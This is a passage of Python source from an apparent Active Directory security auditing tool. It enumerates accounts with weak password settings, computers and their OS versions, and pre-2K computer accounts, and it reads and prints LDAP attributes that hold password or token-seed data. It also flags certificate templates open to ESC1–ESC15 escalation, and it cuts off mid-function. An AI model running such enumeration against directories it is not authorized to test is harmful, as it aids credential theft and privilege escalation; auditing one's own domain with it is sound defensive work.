		except Exception as e:
			if str(e).find('invalid attribute type') != -1:
				pass
			else:
				raise

		try:
			entry_generator = search(conn, server, filter = "(orclCommonAttribute=*)",
							attributes = ["samAccountName", "description", "orclCommonAttribute"])
			i = 0
			for entry in entry_generator:
				i += 1
				if (i % PAGED_SIZE == 0):
					maybeSleep()
				if entry["type"] == "searchResEntry":
					nbentries += 1
					
					sam = entry["raw_attributes"]["samAccountName"][0].decode()
					description = entry["raw_attributes"]["description"]
					if description != []:
						description = description[0].decode()
					else:
						description = "<None>"
					
					# Property of the AD users who will use password authentication to log into an Oracle database
					# https://docs.oracle.com/en/database/oracle/oracle-database/23/dbseg/integrating_mads_with_oracle_database.html#GUID-4B702116-EF10-47AC-9267-163553C15FF5
					# https://www.pythian.com/blog/part-3-implementing-oracle-database-active-directory-password-synchronization-using-oracle-cmu
					orclCommonAttribute = entry["raw_attributes"]["orclCommonAttribute"][0]
					print(f"[+] Found '{sam}'")
					print(f"\t[+] Description = {description}")
					print("\t[+] orclCommonAttribute = {}".format(orclCommonAttribute))	
		except Exception as e:
			if str(e).find('invalid attribute type') != -1:
				pass
			else:
				raise

		try:
			entry_generator = search(conn, server, filter = "(defender-tokenData=*)",
							attributes = ["samAccountName", "description", "defender-tokenData"])
			i = 0
			for entry in entry_generator:
				i += 1
				if (i % PAGED_SIZE == 0):
					maybeSleep()
				if entry["type"] == "searchResEntry":
					nbentries += 1
					
					sam = entry["raw_attributes"]["samAccountName"][0].decode()
					description = entry["raw_attributes"]["description"]
					if description != []:
						description = description[0].decode()
					else:
						description = "<None>"
					
					# Contains the token seed and other information required for authentication
					# https://support.oneidentity.com/technical-documents/defender/6.4/administration-guide/66#TOPIC-1955492
					# https://support.quest.com/KBArticleImages/125691/MicrosoftDomainServicesActiveDirectorySchemaClassesDefinedbyDefender.pdf%20(page%205)
					defenderTokenData = entry["raw_attributes"]["defender-tokenData"][0]
					print(f"[+] Found '{sam}'")
					print(f"\t[+] Description = {description}")
					print("\t[+] defender-tokenData = {}".format(defenderTokenData))
		except Exception as e:
			if str(e).find('invalid attribute type') != -1:
				pass
			else:
				raise
		
		if nbentries == 0:
			print("[-] No attributes with passwords found", file = sys.stderr)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def listPwdsNotRequired(conn, server):
	print_yellow("[*] Listing AD accounts without passwords required")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		entry_generator = search(conn, server, attributes = ["distinguishedName", "userAccountControl"])
		nbentries = 0
		i = 0
		global PAGED_SIZE
		for entry in entry_generator:
			i += 1
			if (i % PAGED_SIZE == 0):
				maybeSleep()
			if entry["type"] == "searchResEntry":
				if (entry["raw_attributes"]["userAccountControl"] != []):
					uacVal = int(entry["raw_attributes"]["userAccountControl"][0])
					dn = entry["raw_attributes"]["distinguishedName"][0].decode()
					if USER_ACCOUNT_CONTROL_MASK["PASSWD_NOTREQD"] & uacVal:
						nbentries += 1
						print(f"[+] {dn}")

		if nbentries == 0:
			print("[-] All AD accounts have passwords required", file = sys.stderr)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def listPwdsDontExpired(conn, server):
	print_yellow("[*] Listing AD accounts with passwords that dont expired")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		entry_generator = search(conn, server, attributes = ["distinguishedName", "userAccountControl"])
		nbentries = 0
		i = 0
		global PAGED_SIZE
		for entry in entry_generator:
			i += 1
			if (i % PAGED_SIZE == 0):
				maybeSleep()
			if entry["type"] == "searchResEntry":
				if (entry["raw_attributes"]["userAccountControl"] != []):
					uacVal = int(entry["raw_attributes"]["userAccountControl"][0])
					dn = entry["raw_attributes"]["distinguishedName"][0].decode()
					if USER_ACCOUNT_CONTROL_MASK["DONT_EXPIRE_PASSWORD"] & uacVal:
						nbentries += 1
						print(f"[+] {dn}")

		if nbentries == 0:
			print("[-] All AD accounts have passwords configured to expire", file = sys.stderr)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def listPwdsExpired(conn, server):
	print_yellow("[*] Listing AD accounts with passwords expired")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		entry_generator = search(conn, server, attributes = ["distinguishedName", "userAccountControl"])
		nbentries = 0
		i = 0
		global PAGED_SIZE
		for entry in entry_generator:
			i += 1
			if (i % PAGED_SIZE == 0):
				maybeSleep()
			if entry["type"] == "searchResEntry":
				if (entry["raw_attributes"]["userAccountControl"] != []):
					uacVal = int(entry["raw_attributes"]["userAccountControl"][0])
					dn = entry["raw_attributes"]["distinguishedName"][0].decode()
					if USER_ACCOUNT_CONTROL_MASK["PASSWORD_EXPIRED"] & uacVal:
						nbentries += 1
						print(f"[+] {dn}")

		if nbentries == 0:
			print("[-] No AD accounts with passwords expired", file = sys.stderr)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def listPwdsReversibleEncryption(conn, server):
	print_yellow("[*] Listing AD accounts with passwords stored with reversible encryption")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		entry_generator = search(conn, server, attributes = ["distinguishedName", "userAccountControl"])
		nbentries = 0
		i = 0
		global PAGED_SIZE
		for entry in entry_generator:
			i += 1
			if (i % PAGED_SIZE == 0):
				maybeSleep()
			if entry["type"] == "searchResEntry":
				if (entry["raw_attributes"]["userAccountControl"] != []):
					uacVal = int(entry["raw_attributes"]["userAccountControl"][0])
					dn = entry["raw_attributes"]["distinguishedName"][0].decode()
					if USER_ACCOUNT_CONTROL_MASK["ENCRYPTED_TEXT_PWD_ALLOWED"] & uacVal:
						nbentries += 1
						print(f"[+] {dn}")

		if nbentries == 0:
			print("[-] No AD accounts have passwords stored with reversible encryption", file = sys.stderr)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

#####################################################
#                     Accounts                      #
#####################################################

def listAccDisabled(conn, server):
	print_yellow("[*] Listing AD accounts disabled")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		entry_generator = search(conn, server, attributes = ["distinguishedName", "userAccountControl"])
		nbentries = 0
		i = 0
		global PAGED_SIZE
		for entry in entry_generator:
			i += 1
			if (i % PAGED_SIZE == 0):
				maybeSleep()
			if entry["type"] == "searchResEntry":
				if (entry["raw_attributes"]["userAccountControl"] != []):
					uacVal = int(entry["raw_attributes"]["userAccountControl"][0])
					dn = entry["raw_attributes"]["distinguishedName"][0].decode()
					if USER_ACCOUNT_CONTROL_MASK["ACCOUNTDISABLE"] & uacVal:
						nbentries += 1
						print(f"[+] {dn}")

		if nbentries == 0:
			print("[-] No AD accounts disabled", file = sys.stderr)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def listAccLocked(conn, server):
	print_yellow("[*] Listing AD accounts locked")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		entry_generator = search(conn, server, attributes = ["distinguishedName", "userAccountControl"])
		nbentries = 0
		i = 0
		global PAGED_SIZE
		for entry in entry_generator:
			i += 1
			if (i % PAGED_SIZE == 0):
				maybeSleep()
			if entry["type"] == "searchResEntry":
				if (entry["raw_attributes"]["userAccountControl"] != []):
					uacVal = int(entry["raw_attributes"]["userAccountControl"][0])
					dn = entry["raw_attributes"]["distinguishedName"][0].decode()
					if USER_ACCOUNT_CONTROL_MASK["LOCKOUT"] & uacVal:
						nbentries += 1
						print(f"[+] {dn}")

		if nbentries == 0:
			print("[-] No AD accounts locked", file = sys.stderr)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def listUsers(conn, server):
	print_yellow("[*] Listing AD users")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		entry_generator = search(conn, server, filter = "(sAMAccountType=805306368)", attributes = ["distinguishedName", "sAMAccountName", "description"])
		nbentries = 0
		i = 0
		global PAGED_SIZE
		for entry in entry_generator:
			i += 1
			if (i % PAGED_SIZE == 0):
				maybeSleep()
			if entry["type"] == "searchResEntry":
				nbentries += 1
				sam = entry["raw_attributes"]["sAMAccountName"][0].decode()
				dn = entry["raw_attributes"]["distinguishedName"][0].decode()
				desc = entry["raw_attributes"]["description"]
				if desc != []:
					desc = desc[0].decode()
				else:
					desc = "<Empty>"
				print(f"[+] {sam}")
				print(f"\t[+] Distinguished Name = {dn}")
				print(f"\t[+] Description = {desc}")

		if nbentries == 0:
			print("[-] No AD users found", file = sys.stderr)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def listComputers(conn, server):
	print_yellow("[*] Listing AD computers")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		entry_generator = search(conn, server, filter = "(objectClass=computer)", attributes = ["distinguishedName", "sAMAccountName", "description"])
		nbentries = 0
		i = 0
		global PAGED_SIZE
		for entry in entry_generator:
			i += 1
			if (i % PAGED_SIZE == 0):
				maybeSleep()
			if entry["type"] == "searchResEntry":
				nbentries += 1
				sam = entry["raw_attributes"]["sAMAccountName"][0].decode()
				dn = entry["raw_attributes"]["distinguishedName"][0].decode()
				desc = entry["raw_attributes"]["description"]
				if desc != []:
					desc = desc[0].decode()
				else:
					desc = "<Empty>"
				print(f"[+] {sam}")
				print(f"\t[+] Distinguished Name = {dn}")
				print(f"\t[+] Description = {desc}")

		if nbentries == 0:
			print("[-] No AD computers found", file = sys.stderr)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

#############################################################
#                     Operating System                      #
#############################################################

def listOS(conn, server):
	print_yellow("[*] Listing AD computers OS")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		entry_generator = search(conn, server, filter = "(objectClass=computer)", attributes = ["distinguishedName", "sAMAccountName", "operatingSystem", "operatingSystemVersion", "description"])
		nbentries = 0
		i = 0
		global PAGED_SIZE
		for entry in entry_generator:
			i += 1
			if (i % PAGED_SIZE == 0):
				maybeSleep()
			if entry["type"] == "searchResEntry":
				nbentries += 1
				sam = entry["raw_attributes"]["sAMAccountName"][0].decode()
				dn = entry["raw_attributes"]["distinguishedName"][0].decode()
				desc = entry["raw_attributes"]["description"]
				if desc != []:
					desc = desc[0].decode()
				else:
					desc = "<Empty>"
				os = entry["raw_attributes"]["operatingSystem"]
				if os != []:
					os = os[0].decode()
				else:
					os = "<NoOSInformation>"
				osVersion = entry["raw_attributes"]["operatingSystemVersion"]
				if osVersion != []:
					osVersion = osVersion[0].decode()
				else:
					osVersion = "<NoVersion>"
				print(f"[{sam}] {os} / {osVersion}")
				print(f"\t[+] Distinguished Name = {dn}")
				print(f"\t[+] Description = {desc}")

		if nbentries == 0:
			print("[-] No AD computers found", file = sys.stderr)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

##############################################################
#                     Pre-2K Computers                       #
##############################################################

def listPRE2K(conn, server):
	print_yellow("[*] Listing Pre-2K computers with logonCount = 0")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		entry_generator = search(conn, server, filter = "(logonCount=0)", attributes = ["distinguishedName", "userAccountControl"])
		nbentries = 0
		i = 0
		global PAGED_SIZE
		for entry in entry_generator:
			i += 1
			if (i % PAGED_SIZE == 0):
				maybeSleep()
			if entry["type"] == "searchResEntry":
				uacVal = int(entry["raw_attributes"]["userAccountControl"][0])
				dn = entry["raw_attributes"]["distinguishedName"][0].decode()
				if USER_ACCOUNT_CONTROL_MASK["WORKSTATION_TRUST_ACCOUNT"] & uacVal and USER_ACCOUNT_CONTROL_MASK["PASSWD_NOTREQD"] & uacVal:
					nbentries += 1
					print(f"[+] Pre-2K computer '{dn}' found with logonCount = 0")
		
		if nbentries == 0:
			print("[-] No Pre-2K computers with logonCount = 0 found", file = sys.stderr)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

##################################################
#                     ADCS                       #
##################################################

def to_pascal_case(s):
	components = s.split("_")
	return "".join(x.title() for x in components)

def _high_bit(value):
	"""returns index of highest bit, or -1 if value is zero or negative"""
	return value.bit_length() - 1

def _decompose(flag, value):
	"""Extract all members from the value."""
	# _decompose is only called if the value is not named
	not_covered = value
	negative = value < 0
	members = []
	for member in flag:
		member_value = member.value
		if member_value and member_value & value == member_value:
			members.append(member)
			not_covered &= ~member_value
	if not negative:
		tmp = not_covered
		while tmp:
			flag_value = 2 ** _high_bit(tmp)
			if flag_value in flag._value2member_map_:
				members.append(flag._value2member_map_[flag_value])
				not_covered &= ~flag_value
			tmp &= ~flag_value
	if not members and value in flag._value2member_map_:
		members.append(flag._value2member_map_[value])
	members.sort(key=lambda m: m._value_, reverse=True)
	if len(members) > 1 and members[0].value == value:
		# We have the breakdown, don't need the value member itself
		members.pop(0)
	return members, not_covered

class IntFlag(enum.IntFlag):
	def to_list(self):
		cls = self.__class__
		members, _ = _decompose(cls, self._value_)
		return members

	def to_str_list(self):
		return list(map(lambda x: str(x), self.to_list()))

	def __str__(self):
		cls = self.__class__
		if self._name_ is not None:
			return "%s" % (to_pascal_case(self._name_))
		members, _ = _decompose(cls, self._value_)
		if len(members) == 1 and members[0]._name_ is None:
			return "%r" % (members[0]._value_)
		else:
			return "%s" % (", ".join([to_pascal_case(str(m._name_ or m._value_)) for m in members]),)

def span_to_str(span):
	if (span % 31536000 == 0) and (span // 31536000) >= 1:
		if (span / 31536000) == 1:
			return "1 year"
		return "%i years" % (span // 31536000)
	elif (span % 2592000 == 0) and (span // 2592000) >= 1:
		if (span // 2592000) == 1:
			return "1 month"
		else:
			return "%i months" % (span // 2592000)
	elif (span % 604800 == 0) and (span // 604800) >= 1:
		if (span / 604800) == 1:
			return "1 week"
		else:
			return "%i weeks" % (span // 604800)
	elif (span % 86400 == 0) and (span // 86400) >= 1:
		if (span // 86400) == 1:
			return "1 day"
		else:
			return "%i days" % (span // 86400)
	elif (span % 3600 == 0) and (span / 3600) >= 1:
		if (span // 3600) == 1:
			return "1 hour"
		else:
			return "%i hours" % (span // 3600)
	else:
		return ""

def filetime_to_span(filetime):
	(span,) = struct.unpack("<q", filetime)
	span *= -0.0000001

	return int(span)

def filetime_to_str(filetime):
	return span_to_str(filetime_to_span(filetime))

# https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/1192823c-d839-4bc3-9b6b-fa8c53507ae1
class MS_PKI_CERTIFICATE_NAME_FLAG(IntFlag):
	NONE = 0x00000000
	ENROLLEE_SUPPLIES_SUBJECT = 0x00000001
	ADD_EMAIL = 0x00000002
	ADD_OBJ_GUID = 0x00000004
	OLD_CERT_SUPPLIES_SUBJECT_AND_ALT_NAME = 0x00000008
	ADD_DIRECTORY_PATH = 0x00000100
	ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME = 0x00010000
	SUBJECT_ALT_REQUIRE_DOMAIN_DNS = 0x00400000
	SUBJECT_ALT_REQUIRE_SPN = 0x00800000
	SUBJECT_ALT_REQUIRE_DIRECTORY_GUID = 0x01000000
	SUBJECT_ALT_REQUIRE_UPN = 0x02000000
	SUBJECT_ALT_REQUIRE_EMAIL = 0x04000000
	SUBJECT_ALT_REQUIRE_DNS = 0x08000000
	SUBJECT_REQUIRE_DNS_AS_CN = 0x10000000
	SUBJECT_REQUIRE_EMAIL = 0x20000000
	SUBJECT_REQUIRE_COMMON_NAME = 0x40000000
	SUBJECT_REQUIRE_DIRECTORY_PATH = 0x80000000

# https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/ec71fd43-61c2-407b-83c9-b52272dec8a1
class MS_PKI_ENROLLMENT_FLAG(IntFlag):
	NONE = 0x00000000
	INCLUDE_SYMMETRIC_ALGORITHMS = 0x00000001
	PEND_ALL_REQUESTS = 0x00000002
	PUBLISH_TO_KRA_CONTAINER = 0x00000004
	PUBLISH_TO_DS = 0x00000008
	AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE = 0x00000010
	AUTO_ENROLLMENT = 0x00000020
	CT_FLAG_DOMAIN_AUTHENTICATION_NOT_REQUIRED = 0x80
	PREVIOUS_APPROVAL_VALIDATE_REENROLLMENT = 0x00000040
	USER_INTERACTION_REQUIRED = 0x00000100
	ADD_TEMPLATE_NAME = 0x200
	REMOVE_INVALID_CERTIFICATE_FROM_PERSONAL_STORE = 0x00000400
	ALLOW_ENROLL_ON_BEHALF_OF = 0x00000800
	ADD_OCSP_NOCHECK = 0x00001000
	ENABLE_KEY_REUSE_ON_NT_TOKEN_KEYSET_STORAGE_FULL = 0x00002000
	NOREVOCATIONINFOINISSUEDCERTS = 0x00004000
	INCLUDE_BASIC_CONSTRAINTS_FOR_EE_CERTS = 0x00008000
	ALLOW_PREVIOUS_APPROVAL_KEYBASEDRENEWAL_VALIDATE_REENROLLMENT = 0x00010000
	ISSUANCE_POLICIES_FROM_REQUEST = 0x00020000
	SKIP_AUTO_RENEWAL = 0x00040000
	NO_SECURITY_EXTENSION = 0x00080000

# https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/f6122d87-b999-4b92-bff8-f465e8949667
class MS_PKI_PRIVATE_KEY_FLAG(IntFlag):
	REQUIRE_PRIVATE_KEY_ARCHIVAL = 0x00000001
	EXPORTABLE_KEY = 0x00000010
	STRONG_KEY_PROTECTION_REQUIRED = 0x00000020
	REQUIRE_ALTERNATE_SIGNATURE_ALGORITHM = 0x00000040
	REQUIRE_SAME_KEY_RENEWAL = 0x00000080
	USE_LEGACY_PROVIDER = 0x00000100
	ATTEST_NONE = 0x00000000
	ATTEST_REQUIRED = 0x00002000
	ATTEST_PREFERRED = 0x00001000
	ATTESTATION_WITHOUT_POLICY = 0x00004000
	EK_TRUST_ON_USE = 0x00000200
	EK_VALIDATE_CERT = 0x00000400
	EK_VALIDATE_KEY = 0x00000800
	HELLO_LOGON_KEY = 0x00200000

# https://github.com/GhostPack/Certify/blob/2b1530309c0c5eaf41b2505dfd5a68c83403d031/Certify/Domain/CertificateAuthority.cs#L23
class MS_PKI_CERTIFICATE_AUTHORITY_FLAG(IntFlag):
	NO_TEMPLATE_SUPPORT = 0x00000001
	SUPPORTS_NT_AUTHENTICATION = 0x00000002
	CA_SUPPORTS_MANUAL_AUTHENTICATION = 0x00000004
	CA_SERVERTYPE_ADVANCED = 0x00000008

# https://www.pkisolutions.com/object-identifiers-oid-in-pki/
OID_TO_STR_MAP = {
	"1.3.6.1.4.1.311.76.6.1": "Windows Update",
	"1.3.6.1.4.1.311.10.3.11": "Key Recovery",
	"1.3.6.1.4.1.311.10.3.25": "Windows Third Party Application Component",
	"1.3.6.1.4.1.311.21.6": "Key Recovery Agent",
	"1.3.6.1.4.1.311.10.3.6": "Windows System Component Verification",
	"1.3.6.1.4.1.311.61.4.1": "Early Launch Antimalware Drive",
	"1.3.6.1.4.1.311.10.3.23": "Windows TCB Component",
	"1.3.6.1.4.1.311.61.1.1": "Kernel Mode Code Signing",
	"1.3.6.1.4.1.311.10.3.26": "Windows Software Extension Verification",
	"2.23.133.8.3": "Attestation Identity Key Certificate",
	"1.3.6.1.4.1.311.76.3.1": "Windows Store",
	"1.3.6.1.4.1.311.10.6.1": "Key Pack Licenses",
	"1.3.6.1.4.1.311.20.2.2": "Smart Card Logon",
	"1.3.6.1.5.2.3.5": "KDC Authentication",
	"1.3.6.1.5.5.7.3.7": "IP security use",
	"1.3.6.1.4.1.311.10.3.8": "Embedded Windows System Component Verification",
	"1.3.6.1.4.1.311.10.3.20": "Windows Kits Component",
	"1.3.6.1.5.5.7.3.6": "IP security tunnel termination",
	"1.3.6.1.4.1.311.10.3.5": "Windows Hardware Driver Verification",
	"1.3.6.1.5.5.8.2.2": "IP security IKE intermediate",
	"1.3.6.1.4.1.311.10.3.39": "Windows Hardware Driver Extended Verification",
	"1.3.6.1.4.1.311.10.6.2": "License Server Verification",
	"1.3.6.1.4.1.311.10.3.5.1": "Windows Hardware Driver Attested Verification",
	"1.3.6.1.4.1.311.76.5.1": "Dynamic Code Generato",
	"1.3.6.1.5.5.7.3.8": "Time Stamping",
	"1.3.6.1.4.1.311.10.3.4.1": "File Recovery",
	"1.3.6.1.4.1.311.2.6.1": "SpcRelaxedPEMarkerCheck",
	"2.23.133.8.1": "Endorsement Key Certificate",
	"1.3.6.1.4.1.311.2.6.2": "SpcEncryptedDigestRetryCount",
	"1.3.6.1.4.1.311.10.3.4": "Encrypting File System",
	"1.3.6.1.5.5.7.3.1": "Server Authentication",
	"1.3.6.1.4.1.311.61.5.1": "HAL Extension",
	"1.3.6.1.5.5.7.3.4": "Secure Email",
	"1.3.6.1.5.5.7.3.5": "IP security end system",
	"1.3.6.1.4.1.311.10.3.9": "Root List Signe",
	"1.3.6.1.4.1.311.10.3.30": "Disallowed List",
	"1.3.6.1.4.1.311.10.3.19": "Revoked List Signe",
	"1.3.6.1.4.1.311.10.3.21": "Windows RT Verification",
	"1.3.6.1.4.1.311.10.3.10": "Qualified Subordination",
	"1.3.6.1.4.1.311.10.3.12": "Document Signing",
	"1.3.6.1.4.1.311.10.3.24": "Protected Process Verification",
	"1.3.6.1.4.1.311.80.1": "Document Encryption",
	"1.3.6.1.4.1.311.10.3.22": "Protected Process Light Verification",
	"1.3.6.1.4.1.311.21.19": "Directory Service Email Replication",
	"1.3.6.1.4.1.311.21.5": "Private Key Archival",
	"1.3.6.1.4.1.311.10.5.1": "Digital Rights",
	"1.3.6.1.4.1.311.10.3.27": "Preview Build Signing",
	"1.3.6.1.4.1.311.20.2.1": "Certificate Request Agent",
	"2.23.133.8.2": "Platform Certificate",
	"1.3.6.1.4.1.311.20.1": "CTL Usage",
	"1.3.6.1.5.5.7.3.9": "OCSP Signing",
	"1.3.6.1.5.5.7.3.3": "Code Signing",
	"1.3.6.1.4.1.311.10.3.1": "Microsoft Trust List Signing",
	"1.3.6.1.4.1.311.10.3.2": "Microsoft Time Stamping",
	"1.3.6.1.4.1.311.76.8.1": "Microsoft Publishe",
	"1.3.6.1.5.5.7.3.2": "Client Authentication",
	"1.3.6.1.5.2.3.4": "PKINIT Client Authentication",
	"1.3.6.1.4.1.311.10.3.13": "Lifetime Signing",
	"2.5.29.37.0": "Any Purpose",
	"1.3.6.1.4.1.311.64.1.1": "Server Trust",
	"1.3.6.1.4.1.311.10.3.7": "OEM Windows System Component Verification",
}

OID_TO_STR_MAP_INV = {v: k for k, v in OID_TO_STR_MAP.items()}

def canEnroll(conn, server, sd, sids):
	if (sd.Dacl.AceCount != 0):
		dacl = sd.Dacl.to_sddl()
		dacl = dacl[dacl.find("(")+1:-1]
		for ace in dacl.split(")("):
			ace_type, ace_flags, rights, object_guid, inherit_object_guid, account_sid = ace.split(";")
			type = SDDL_TO_ACE_TYPE_STR(ace_type)
			object_guid = SDDL_TO_ACE_OBJECT_GUID_STR(conn, server, object_guid)
			if (account_sid in sids.keys() and type == "ACCESS_ALLOWED_OBJECT_ACE_TYPE" and object_guid == "Certificate-Enrollment"):
				return True
	
	return False

def writeAccess(sd, sids):
	if (sd.Dacl.AceCount != 0):
		dacl = sd.Dacl.to_sddl()
		dacl = dacl[dacl.find("(")+1:-1]
		for ace in dacl.split(")("):
			ace_type, ace_flags, rights, object_guid, inherit_object_guid, account_sid = ace.split(";")
			type = SDDL_TO_ACE_TYPE_STR(ace_type)
			mask = SDDL_TO_ACE_ACCESS_RIGHTS_STR(rights)
			if (account_sid in sids.keys() and type == "ACCESS_ALLOWED_ACE_TYPE" and ('GENERIC_WRITE' in mask or 'WRITE_DACL' in mask or 'WRITE_OWNER' in mask)): # WRITE_PROPERTY/EXTENDED_RIGHTS may also be used
				return True
	
	return False

def canManageCACertificates(sd, sids):
	if (sd.Dacl.AceCount != 0):
		dacl = sd.Dacl.to_sddl(ace_rights_adcs = True)
		dacl = dacl[dacl.find("(")+1:-1]
		for ace in dacl.split(")("):
			ace_type, ace_flags, rights, object_guid, inherit_object_guid, account_sid = ace.split(";")
			type = SDDL_TO_ACE_TYPE_STR(ace_type)
			mask = SDDL_TO_ACE_ACCESS_RIGHTS_CERTIFICATIONAUTHORITY_STR(rights)
			if (account_sid in sids.keys() and type == "ACCESS_ALLOWED_ACE_TYPE" and ('MANAGE_CA' in mask or 'MANAGE_CERTIFICATES' in mask)):
				return True
	
	return False

def isVulnerableADCS(conn, server, sd, sids, webEnrollment, userSpecifiedSAN, EKU, requiresManagerApproval, enrolleeSuppliesSubject, tplSchemaVersion):
	haveESCX = False
	ESCX = []

	# Does not check if enabled or not 

	# ESC1
	if requiresManagerApproval == False and 'Client Authentication' in EKU and enrolleeSuppliesSubject == True and canEnroll(conn, server, sd, sids):
		haveESCX = True
		ESCX += ['ESC1']
	
	# ESC2
	if requiresManagerApproval == False and ('Any Purpose' in EKU or EKU == []) and canEnroll(conn, server, sd, sids):
		haveESCX = True
		ESCX += ['ESC2']

	# ESC3
	if requiresManagerApproval == False and 'Certificate Request Agent' in EKU and canEnroll(conn, server, sd, sids):
		haveESCX = True
		ESCX += ['ESC3']

	# ESC4
	if requiresManagerApproval == False and writeAccess(sd, sids):
		haveESCX = True
		ESCX += ['ESC4']

	# ESC5 -> ListACLTrusts

	# ESC6
	if userSpecifiedSAN == 'Enabled':
		haveESCX = True
		ESCX += ['ESC6']
	
	# ESC7
	if canManageCACertificates(sd, sids):
		haveESCX = True
		ESCX += ['ESC7']

	# ESC8
	if webEnrollment == True:
		haveESCX = True
		ESCX += ['ESC8']
	
	# ESC15
	if requiresManagerApproval == False and tplSchemaVersion == '1' and enrolleeSuppliesSubject == True and canEnroll(conn, server, sd, sids):
		haveESCX = True
		ESCX += ['ESC15']

	return (haveESCX, ESCX)

def listADCS(conn, server, ip, user, pwd, domain, nthash, aesKey, ccache, objects):
	print_yellow("[*] Listing Active Directory Certificate Services")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		if objects != []:
			print("[+] Searching provided AD objects' memberships")
			objects = getMemberOfs(conn, server, objects)
			if (len(objects) == 0):
				print("\t[-] Provided AD objects does not exist", file = sys.stderr)
				return
			else:
				print_nested_dict(objects, indent = 1)
			sids = getSIDs(conn, server, flatten_dict(objects))
			if len(sids) == 0:
				print("[-] Failed to get SIDs of provided AD objects", file = sys.stderr)
				return
			sids["S-1-5-11"] = "Authenticated Users"
			sids["S-1-1-0"] = "Everyone"

			# Adding Domain Computers group to sids if MAQ > 0 (default = 10) and provided SIDs can add computers
			entry_generator = search(conn, server, filter = "(objectClass=domainDNS)", attributes = ["ms-DS-MachineAccountQuota", "objectSID"])
			maq = None
			domainComputersSID = None
			for entry in entry_generator:
				if entry["type"] == "searchResEntry":
					maq = int(entry["raw_attributes"]["ms-DS-MachineAccountQuota"][0])
					objectSID = entry["raw_attributes"]["objectSID"]
					domainSID = SID.from_bytes(objectSID[0]).__str__()
					domainComputersSID = domainSID + "-515"
					break
			if domainComputersSID not in sids.keys():
				print("[+] Check if MAQ > 0 and provided SIDs can add computers")
				if maq > 0:
					print(f"\t[+] MAQ = {maq}")

					# Search if provided SIDs can add computers from GPO 'Default Domain Controllers Policy' ({6AC1786C-016F-11D2-945F-00C04fB984F9})
					guid = "{6AC1786C-016F-11D2-945F-00C04fB984F9}"
					originalSTDOUT = sys.stdout
					originalSTDERR = sys.stderr
					sys.stdout = StringIO()
					sys.stderr = StringIO()
					try:
						connSMB = SMBUtil.connect_smb(ip, user, pwd, domain, nthash, aesKey, ccache)
						if connSMB == '':
							sys.stdout = originalSTDOUT
							sys.stderr = originalSTDERR
							print("\t[-] Failed to get SMB connection. Domain computers not added to SIDs", file = sys.stderr)
						else:
							targetDomainDN = server.info.other['defaultNamingContext'][0]
							targetDomain = targetDomain = ('.'.join([x.strip("DC=") for x in targetDomainDN.split(",")])).lower()
							gpoPath = f'{targetDomain}/Policies/{guid}/Machine/Microsoft/Windows NT/SecEdit/GptTmpl.inf'
